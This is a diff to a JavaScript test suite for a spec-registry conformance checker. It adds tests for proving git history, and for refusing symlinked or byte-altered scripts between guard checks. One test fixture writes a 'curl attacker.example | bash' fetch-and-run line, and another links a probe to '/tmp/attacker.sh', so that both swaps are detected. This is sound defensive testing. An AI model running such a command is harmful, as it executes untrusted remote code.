@@ -15,7 +15,7 @@ import { fileURLToPath } from 'node:url';
 import { execFileSync } from 'node:child_process';
 import {
   loadSpecSources, validateSpecRegistry, parseSpecTables, runConformance,
-  assertConformTarget, annotationOffenses, CHECK_TIMEOUT_MS, CONFORM_TEST_TIMEOUT_MS,
+  assertConformTarget, assertChildBoundary, annotationOffenses, CHECK_TIMEOUT_MS, CONFORM_TEST_TIMEOUT_MS,
   resolvePreviousRegistryRaw, governedPathOffenses, diffChangedFiles, runConformanceForCommit,
   SpecRegistryError, REGISTRY_PATH, SPEC_PATH,
 } from '../src/lib/spec-registry.js';
@@ -355,16 +355,26 @@ test('ROUND I1-2: an ACTIVE anchor symbol must actually appear in its file', () 
 test('ROUND I1-3: the history baseline is never the bytes under validation', () => {
   const HEAD_RAW = '{"head":true}';
   const PARENT_RAW = '{"parent":true}';
-  const scripted = ({ head = HEAD_RAW, parent = PARENT_RAW, shallow = 'false' } = {}) => (cmd, args) => {
-    if (args[0] === 'rev-parse' && args[1] === '--is-shallow-repository') return `${shallow}\n`;
-    assert.equal(args[0], 'show');
-    if (args[1] === `HEAD:${REGISTRY_PATH}`) {
-      if (head === null) throw new Error('no HEAD version');
-      return head;
+  const PARENT_SHA = 'p'.repeat(40);
+  // A scripted history that answers the PROOF calls: shallow probe, ls-tree presence, show
+  // content, parent enumeration. `head`/`parent` null means "file proven absent there";
+  // `parents: []` means a proven root commit; a function response simulates git breaking.
+  const scripted = ({ head = HEAD_RAW, parent = PARENT_RAW, shallow = 'false', parents = [PARENT_SHA], breakShow = false } = {}) => (cmd, args) => {
+    if (args[0] === 'rev-parse' && args[1] === '--is-shallow-repository') {
+      if (shallow instanceof Error) throw shallow;
+      return `${shallow}\n`;
     }
-    if (args[1] === `HEAD~1:${REGISTRY_PATH}`) {
-      if (parent === null) throw new Error('no parent version');
-      return parent;
+    if (args[0] === 'rev-list') return `${'h'.repeat(40)} ${parents.join(' ')}\n`.trim() + '\n';
+    if (args[0] === 'ls-tree') {
+      const ref = args[1];
+      const value = ref === 'HEAD' ? head : parent;
+      return value === null ? '' : `100644 blob abc\t${REGISTRY_PATH}\n`;
+    }
+    if (args[0] === 'show') {
+      if (breakShow) throw new Error('git show broke');
+      const value = args[1].startsWith('HEAD:') ? head : parent;
+      if (value === null) throw new Error('absent');
+      return value;
     }
     throw new Error(`unexpected: ${args.join(' ')}`);
   };
@@ -381,6 +391,19 @@ test('ROUND I1-3: the history baseline is never the bytes under validation', () 
     () => resolvePreviousRegistryRaw({ currentRaw: HEAD_RAW, git: scripted({ shallow: 'true' }) }),
     /HISTORY_TRUNCATED/,
   );
+  // ROUND I1-5: a git FAILURE is never absence. The shallow probe breaking, and `show` breaking
+  // for a file ls-tree just listed, each refuse by name in a NON-shallow repository.
+  assert.throws(
+    () => resolvePreviousRegistryRaw({ currentRaw: HEAD_RAW, git: scripted({ shallow: new Error('rev-parse broke') }) }),
+    /HISTORY_UNPROVABLE: could not determine whether this clone is shallow/,
+  );
+  assert.throws(
+    () => resolvePreviousRegistryRaw({ currentRaw: HEAD_RAW, git: scripted({ breakShow: true }) }),
+    /HISTORY_UNPROVABLE: .* could not be read/,
+  );
+  // A PROVEN root commit, and a file PROVEN absent at the parent, are the only legitimate nulls.
+  assert.equal(resolvePreviousRegistryRaw({ currentRaw: HEAD_RAW, git: scripted({ parents: [] }) }), null);
+  assert.equal(resolvePreviousRegistryRaw({ currentRaw: HEAD_RAW, git: scripted({ parent: null }) }), null);
   // …and the REAL loader's baseline is tested by PROVENANCE, not by content inequality: a commit
   // that does not touch the registry legitimately has parent bytes equal to the current bytes
   // (round I1-4 corrected the previous assertion, which failed exactly on such a commit). The
@@ -480,24 +503,26 @@ test('ROUND I1-3: a governed-path change without moving evidence is an offense',
 });
 
 test('ROUND I1-3/4: diffChangedFiles picks the honest baseline and sees BOTH sides of a rename', () => {
-  const scripted = (responses) => (cmd, args) => {
+  const C = 'c'.repeat(40);
+  const P = 'p'.repeat(40);
+  const scripted = (responses, { parents = [P] } = {}) => (cmd, args) => {
     const key = args.join(' ');
     if (key === 'rev-parse --is-shallow-repository') return 'false\n';
+    if (args[0] === 'rev-list') return `${'h'.repeat(40)} ${parents.join(' ')}`.trim() + '\n';
     if (!(key in responses)) throw new Error(`unexpected: ${key}`);
     const v = responses[key];
     if (v instanceof Error) throw v;
     return v;
   };
-  const C = 'c'.repeat(40);
-  // Commit mode: the commit against its parent, name-status parsed.
+  // Commit mode: the commit against its PROVEN parent, name-status parsed.
   assert.deepEqual(
-    diffChangedFiles({ commit: C, git: scripted({ [`diff --name-status -M ${C}~1 ${C}`]: 'A\ta.js\nM\tb.md\n' }) }),
+    diffChangedFiles({ commit: C, git: scripted({ [`diff --name-status -M ${P} ${C}`]: 'A\ta.js\nM\tb.md\n' }) }),
     ['a.js', 'b.md'],
   );
   // ROUND I1-4 (Codex's reproduction): a rename reports BOTH paths, so a governed file renamed
   // AWAY still counts as touched.
   assert.deepEqual(
-    diffChangedFiles({ commit: C, git: scripted({ [`diff --name-status -M ${C}~1 ${C}`]: 'R097\tsrc/lib/spec-registry.js\tsrc/lib/spec-registry-moved.js\n' }) }),
+    diffChangedFiles({ commit: C, git: scripted({ [`diff --name-status -M ${P} ${C}`]: 'R097\tsrc/lib/spec-registry.js\tsrc/lib/spec-registry-moved.js\n' }) }),
     ['src/lib/spec-registry.js', 'src/lib/spec-registry-moved.js'],
   );
   // Dirty worktree: worktree vs HEAD, untracked included.
@@ -505,15 +530,21 @@ test('ROUND I1-3/4: diffChangedFiles picks the honest baseline and sees BOTH sid
     diffChangedFiles({ git: scripted({ 'status --porcelain': ' M a.js\n?? new.md\n', 'diff --name-status -M HEAD': 'M\ta.js\n' }) }),
     ['a.js', 'new.md'],
   );
-  // Clean checkout: HEAD against its parent — never an empty self-diff.
+  // Clean checkout: HEAD against its PROVEN parent — never an empty self-diff.
   assert.deepEqual(
-    diffChangedFiles({ git: scripted({ 'status --porcelain': '', 'diff --name-status -M HEAD~1 HEAD': 'M\tc.js\n' }) }),
+    diffChangedFiles({ git: scripted({ 'status --porcelain': '', [`diff --name-status -M ${P} HEAD`]: 'M\tc.js\n' }) }),
     ['c.js'],
   );
   // Shallow clones refuse instead of degrading to "no baseline".
   assert.throws(
     () => diffChangedFiles({ git: (cmd, args) => (args[1] === '--is-shallow-repository' ? 'true\n' : '') }),
     /HISTORY_TRUNCATED/,
+  );
+  // ROUND I1-5: a proven ROOT commit is the only legitimate null; a broken diff refuses.
+  assert.equal(diffChangedFiles({ commit: C, git: scripted({}, { parents: [] }) }), null);
+  assert.throws(
+    () => diffChangedFiles({ commit: C, git: scripted({ [`diff --name-status -M ${P} ${C}`]: new Error('diff broke') }) }),
+    /HISTORY_UNPROVABLE: git diff failed/,
   );
   // A rename OUT of a governed directory flags the ACTIVE id even though the destination is
   // outside every governed path.
@@ -551,6 +582,7 @@ test('ROUND I1-4: executed bytes must be regular tracked files — symlinks refu
   const commitSources = loadSpecSources({
     commit: 'a'.repeat(40),
     git: (cmd, args) => {
+      if (args[0] === 'rev-list') return `${'a'.repeat(40)}\n`; // proven root — no baseline
       if (args[0] === 'ls-tree') {
         const rel = args[args.length - 1];
         if (rel === 'link.sh') return `120000 blob abc\tlink.sh\n`;
@@ -609,10 +641,10 @@ test('ROUND I1-3: a check that mutates the tree invalidates the verdict', () => 
       loadDeps: {
         git: (cmd, args) => {
           if (args[0] === 'rev-parse' && args[1] === '--is-shallow-repository') return 'false\n';
+          if (args[0] === 'rev-list') return `${COMMIT}\n`; // proven root — no baseline
           if (args[0] === 'ls-tree') return `100644 blob abc\t${args[args.length - 1]}\n`;
           if (args[0] === 'show' && args[1] === `${COMMIT}:${REGISTRY_PATH}`) return SOURCES.registryRaw;
           if (args[0] === 'show' && args[1] === `${COMMIT}:${SPEC_PATH}`) return SOURCES.specMd;
-          if (args[0] === 'show' && args[1] === `${COMMIT}~1:${REGISTRY_PATH}`) { const e = new Error('none'); throw e; }
           if (args[0] === 'cat-file') return '';
           if (args[0] === 'show') return SOURCES.readFile(args[1].split(':').slice(1).join(':'));
           throw new Error(`unexpected: ${args.join(' ')}`);
@@ -622,6 +654,126 @@ test('ROUND I1-3: a check that mutates the tree invalidates the verdict', () => 
     /CONFORM_WORKTREE_DIRTY/,
   );
   assert.ok(statusCalls >= 2, 'the post-run guard must have re-checked the tree');
+});
+
+test('ROUND I1-5: the child boundary — object, lstat, exact bytes and cleanliness, per child', () => {
+  const COMMIT = 'a'.repeat(40);
+  const REL = 'test/fixtures/tmp-exec-probe.sh';
+  const ABS = path.join(ROOT, REL);
+  const AUDITED = '#!/usr/bin/env bash\nexit 0\n';
+  const gitFor = ({ mode = '100755', blob = AUDITED, status = '' } = {}) => (cmd, args) => {
+    if (args[0] === 'ls-tree') return `${mode} blob abc\t${REL}\n`;
+    if (args[0] === 'show') return blob;
+    if (args[0] === 'status') return status;
+    throw new Error(`unexpected git: ${args.join(' ')}`);
+  };
+  try {
+    // The audited bytes on a physically regular path, clean tree: the boundary holds.
+    fs.writeFileSync(ABS, AUDITED);
+    assert.doesNotThrow(() => assertChildBoundary({ commit: COMMIT, rel: REL, git: gitFor(), root: ROOT }));
+    // Codex's discriminating reproduction: the git OBJECT stays a regular 100755 blob, but the
+    // physical path is swapped for a symlink after the first guard — the boundary refuses.
+    fs.rmSync(ABS);
+    fs.symlinkSync('/tmp/attacker.sh', ABS);
+    assert.throws(
+      () => assertChildBoundary({ commit: COMMIT, rel: REL, git: gitFor(), root: ROOT }),
+      /EXEC_PATH_NOT_REGULAR/,
+    );
+    // Same-shape swap: a regular file whose BYTES are not the audited blob's.
+    fs.rmSync(ABS);
+    fs.writeFileSync(ABS, '#!/usr/bin/env bash\ncurl attacker.example | bash\n');
+    assert.throws(
+      () => assertChildBoundary({ commit: COMMIT, rel: REL, git: gitFor(), root: ROOT }),
+      /EXEC_BYTES_DRIFTED/,
+    );
+    // A non-regular audited object, a missing path, and a dirty tree each refuse by name.
+    fs.rmSync(ABS);
+    fs.writeFileSync(ABS, AUDITED);
+    assert.throws(
+      () => assertChildBoundary({ commit: COMMIT, rel: REL, git: gitFor({ mode: '120000' }), root: ROOT }),
+      /EXEC_NOT_REGULAR_IN_COMMIT/,
+    );
+    assert.throws(
+      () => assertChildBoundary({ commit: COMMIT, rel: REL, git: gitFor({ status: ' M x\n' }), root: ROOT }),
+      /CONFORM_WORKTREE_DIRTY/,
+    );
+    fs.rmSync(ABS);
+    assert.throws(
+      () => assertChildBoundary({ commit: COMMIT, rel: REL, git: gitFor(), root: ROOT }),
+      /EXEC_PATH_MISSING/,
+    );
+  } finally {
+    fs.rmSync(ABS, { force: true });
+  }
+});
+
+test('ROUND I1-5: a swap AFTER the first guard is caught at that child boundary', () => {
+  const COMMIT = 'a'.repeat(40);
+  const REL = 'test/fixtures/tmp-exec-probe.sh';
+  const ABS = path.join(ROOT, REL);
+  const AUDITED = '#!/usr/bin/env bash\nexit 0\n';
+  const registryRaw = JSON.stringify({
+    $comment: ['x'], version: 1,
+    entries: [{
+      id: 'SPEC-GOV-001', status: 'ACTIVE', title: 't',
+      normativeText: 'sentence', normativeSha256: framedTextDigest('SPEC-GOV-001', 'sentence'),
+      anchors: [{ file: REL, symbol: null }],
+      tests: [{ file: 'test/fixtures/conform-probe.js', title: 'conform probe: this test passes' }],
+      checks: [{ kind: 'script', ref: REL }],
+      governedPaths: [REL],
+      mutationEvidence: { commit: 'b'.repeat(40), patchSha256: 'c'.repeat(64), command: 'npm test', expectedFailure: '1' },
+      supersedes: [], supersededBy: null,
+    }],
+  });
+  const specMd = `| SPEC-GOV-001 | ACTIVE | sentence |\n`;
+  const git = (cmd, args) => {
+    if (args[0] === 'rev-parse' && args[1] === '--is-shallow-repository') return 'false\n';
+    if (args[0] === 'rev-parse') return `${COMMIT}\n`;
+    if (args[0] === 'rev-list') return `${COMMIT}\n`;
+    if (args[0] === 'ls-tree') return `100755 blob abc\t${args[args.length - 1]}\n`;
+    if (args[0] === 'show' && args[1] === `${COMMIT}:${REGISTRY_PATH}`) return registryRaw;
+    if (args[0] === 'show' && args[1] === `${COMMIT}:${SPEC_PATH}`) return specMd;
+    if (args[0] === 'show' && args[1] === `${COMMIT}:test/fixtures/conform-probe.js`) {
+      return fs.readFileSync(path.join(ROOT, 'test/fixtures/conform-probe.js'), 'utf8');
+    }
+    if (args[0] === 'show') return AUDITED;
+    if (args[0] === 'cat-file') return '';
+    if (args[0] === 'status') return '';
+    throw new Error(`unexpected git: ${args.join(' ')}`);
+  };
+  try {
+    fs.writeFileSync(ABS, AUDITED);
+    // The check itself performs the swap — the exact window Codex named: the run-level guards
+    // see a clean tree before and after, but the SECOND child boundary sees the symlink.
+    assert.throws(
+      () => runConformanceForCommit({
+        commit: COMMIT,
+        git,
+        root: ROOT,
+        loadDeps: { git },
+        runDeps: {
+          runTests: () => ({ ok: true }),
+          runCheck: () => {
+            fs.rmSync(ABS);
+            fs.symlinkSync('/tmp/attacker.sh', ABS);
+            return { ok: true };
+          },
+        },
+      }),
+      /EXEC_PATH_NOT_REGULAR/,
+    );
+    // …and with an honest check, the same registry conforms end to end.
+    fs.rmSync(ABS, { force: true });
+    fs.writeFileSync(ABS, AUDITED);
+    const report = runConformanceForCommit({
+      commit: COMMIT, git, root: ROOT, loadDeps: { git },
+      runDeps: { runTests: () => ({ ok: true }), runCheck: () => ({ ok: true }) },
+    });
+    assert.equal(report.ok, true);
+    assert.equal(report.activeCount, 1);
+  } finally {
+    fs.rmSync(ABS, { force: true });
+  }
 });
 
 test('POSITIVE CONTROL: the registry file on disk is byte-identical to what validation read', () => {
